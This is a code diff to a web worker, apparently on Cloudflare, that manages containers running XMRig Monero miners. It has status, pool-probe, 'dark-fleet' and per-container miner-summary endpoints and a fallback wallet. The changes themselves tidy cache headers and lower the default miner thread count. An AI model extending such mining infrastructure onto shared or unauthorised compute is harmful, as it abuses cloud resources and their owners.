@@ -32,6 +32,8 @@ const D1_READ_BOOKMARK = "first-unconstrained";
 const STALE_PRUNE_INTERVAL_MS = 5 * 60_000;
 const SLOW_PRUNE_INTERVAL_MS = 60 * 60_000;
 const INTERNAL_REPORTER_ENDPOINT = "http://heartbeat.internal/instances/heartbeat";
+const NO_STORE_CACHE = "no-store";
+const HEALTH_CACHE = "public, max-age=60";
 
 let lastRolledUpHour = 0;
 let lastStalePruneBucket = -1;
@@ -52,6 +54,24 @@ async function readStatsStore(env: Env): Promise<MiningStatsStore> {
 }
 
 const app = new Hono<{ Bindings: Env }>();
+
+function setCacheHeaders(c: Context<{ Bindings: Env }>, value: string): void {
+	c.header("Cache-Control", value);
+	c.header("Cloudflare-CDN-Cache-Control", value);
+	c.header("CDN-Cache-Control", value);
+}
+
+function withCacheHeaders(response: Response, value: string): Response {
+	const headers = new Headers(response.headers);
+	headers.set("Cache-Control", value);
+	headers.set("Cloudflare-CDN-Cache-Control", value);
+	headers.set("CDN-Cache-Control", value);
+	return new Response(response.body, {
+		status: response.status,
+		statusText: response.statusText,
+		headers,
+	});
+}
 
 function coloFromRequest(request: Request | null): string | null {
 	if(!request) return null;
@@ -94,7 +114,7 @@ async function prepareContainerForDirectFetch(env: Env, containerId: string) {
 			MINER_WALLET: env.MINER_WALLET ?? FALLBACK_WALLET,
 			MINER_WORKER_NAME: workerNameFromContainerId(containerId),
 			MINER_TUNING_PROFILE: env.MINER_TUNING_PROFILE ?? "throughput",
-			MINER_THREADS: env.MINER_THREADS ?? "6",
+			MINER_THREADS: env.MINER_THREADS ?? "4",
 			MINER_CPU_PRIORITY: env.MINER_CPU_PRIORITY ?? "5",
 			MINER_CPU_AFFINITY: env.MINER_CPU_AFFINITY ?? "container",
 			MINER_RANDOMX_MODE: env.MINER_RANDOMX_MODE ?? "fast",
@@ -112,7 +132,11 @@ async function prepareContainerForDirectFetch(env: Env, containerId: string) {
 }
 
 app.use("/*", async (c, next) => {
+	setCacheHeaders(c, NO_STORE_CACHE);
+	await next();
+});
 
+app.use("/*", async (c, next) => {
 	if(c.req.path === "/health") return next();
 	if(c.req.path === "/instances/heartbeat") return next();
 
@@ -131,11 +155,12 @@ app.use("/*", async (c, next) => {
 });
 
 app.onError((err, c) => {
+	setCacheHeaders(c, NO_STORE_CACHE);
 	log.error(
 		{ err: err.message, stack: err.stack, path: c.req.path },
 		"worker request error",
 	);
-	if(err instanceof HTTPException) return err.getResponse();
+	if(err instanceof HTTPException) return withCacheHeaders(err.getResponse(), NO_STORE_CACHE);
 	return c.json(
 		{
 			success: false,
@@ -147,8 +172,7 @@ app.onError((err, c) => {
 });
 
 app.get("/health", (c) => {
-	c.header("Cloudflare-CDN-Cache-Control", "max-age=60");
-	c.header("CDN-Cache-Control", "max-age=60");
+	setCacheHeaders(c, HEALTH_CACHE);
 	const authReady = typeof c.env.API_KEY === "string" && c.env.API_KEY.length > 0;
 	const reporterReady = typeof c.env.REPORTER_ENDPOINT === "string" && c.env.REPORTER_ENDPOINT.length > 0;
 	return c.json({
@@ -220,22 +244,16 @@ app.get("/heartbeat-health", async (c) => {
 
 app.get("/status", async (c) => {
 	const status = await coordRpc<unknown>(c.env, c.req.raw, "/status");
-	c.header("Cloudflare-CDN-Cache-Control", "max-age=15");
-	c.header("CDN-Cache-Control", "max-age=15");
 	return c.json(status);
 });
 
 app.get("/instance-details", async (c) => {
 	const details = await coordRpc<unknown>(c.env, c.req.raw, "/instance-details");
-	c.header("Cloudflare-CDN-Cache-Control", "max-age=30");
-	c.header("CDN-Cache-Control", "max-age=30");
 	return c.json(details);
 });
 
 app.get("/dark-fleet", async (c) => {
 	const result = await coordRpc<unknown>(c.env, c.req.raw, "/dark-fleet");
-	c.header("Cloudflare-CDN-Cache-Control", "max-age=15");
-	c.header("CDN-Cache-Control", "max-age=15");
 	return c.json(result);
 });
 
@@ -319,8 +337,6 @@ app.get("/pool-probe", async (c) => {
 	const results = await mapLimit(targets, 3, (target) => probePool(target, timeoutMs));
 
 	const allOk = results.every((r) => r.ok);
-	c.header("Cloudflare-CDN-Cache-Control", "no-store");
-	c.header("CDN-Cache-Control", "no-store");
 	return c.json(
 		{
 			success: true,
@@ -449,8 +465,6 @@ app.get("/instance/:containerId/xmrig-summary", async (c) => {
 			);
 		}
 		const summary = await result.json();
-		c.header("Cloudflare-CDN-Cache-Control", "max-age=10");
-		c.header("CDN-Cache-Control", "max-age=10");
 		return c.json({ success: true, containerId, summary });
 	}catch(err){
 		return c.json(
@@ -466,8 +480,6 @@ app.get("/container-health", async (c) => {
 			instances: Array<{ status: string; containerId: string }>;
 		}>(c.env, c.req.raw, "/status");
 		if(!status.instances?.length){
-			c.header("Cloudflare-CDN-Cache-Control", "max-age=30");
-			c.header("CDN-Cache-Control", "max-age=30");
 			return c.json({ success: true, running: false });
 		}
 
@@ -520,8 +532,6 @@ app.get("/container-health", async (c) => {
 			delete (h as Partial<typeof h>)._ok;
 		}
 
-		c.header("Cloudflare-CDN-Cache-Control", "max-age=30");
-		c.header("CDN-Cache-Control", "max-age=30");
 		return c.json({
 			success: true,
 			running: true,
@@ -589,8 +599,6 @@ app.get("/mining-status", async (c) => {
 				const stats = await readStatsStore(c.env);
 				const report = await stats.getLatestStatusReport();
 				if(report && !report.staleReport){
-					c.header("Cloudflare-CDN-Cache-Control", "max-age=15");
-					c.header("CDN-Cache-Control", "max-age=15");
 					return c.json({
 						success: true,
 						running: report.runningInstances > 0,
@@ -696,8 +704,6 @@ app.get("/mining-status", async (c) => {
 			}
 		}
 
-		c.header("Cloudflare-CDN-Cache-Control", "max-age=15");
-		c.header("CDN-Cache-Control", "max-age=15");
 		return c.json({
 			success: true,
 			running: true,
@@ -721,8 +727,6 @@ app.get("/mining-history", async (c) => {
 		const limit = Number.parseInt(c.req.query("limit") ?? "100", 10);
 		const stats = await readStatsStore(c.env);
 		const history = await stats.getHistory(limit);
-		c.header("Cloudflare-CDN-Cache-Control", "max-age=60");
-		c.header("CDN-Cache-Control", "max-age=60");
 		return c.json({ success: true, history });
 	}catch(err){
 		return c.json({ success: false, error: (err as Error).message }, 500);
@@ -733,8 +737,6 @@ app.get("/mining-totals", async (c) => {
 	try {
 		const stats = await readStatsStore(c.env);
 		const totals = await stats.getTotals();
-		c.header("Cloudflare-CDN-Cache-Control", "max-age=15");
-		c.header("CDN-Cache-Control", "max-age=15");
 		return c.json({ success: true, totals });
 	}catch(err){
 		return c.json({ success: false, error: (err as Error).message }, 500);
@@ -785,8 +787,6 @@ app.get("/quick-status", async (c) => {
 		}>(c.env, c.req.raw, "/status-summary");
 
 		if((status.counts?.total ?? 0) <= 0){
-			c.header("Cloudflare-CDN-Cache-Control", "max-age=15");
-			c.header("CDN-Cache-Control", "max-age=15");
 			return c.json({
 				success: true,
 				running: false,
@@ -822,8 +822,6 @@ app.get("/quick-status", async (c) => {
 			);
 		}
 
-		c.header("Cloudflare-CDN-Cache-Control", "max-age=15");
-		c.header("CDN-Cache-Control", "max-age=15");
 		return c.json({
 			success: true,
 			running: true,
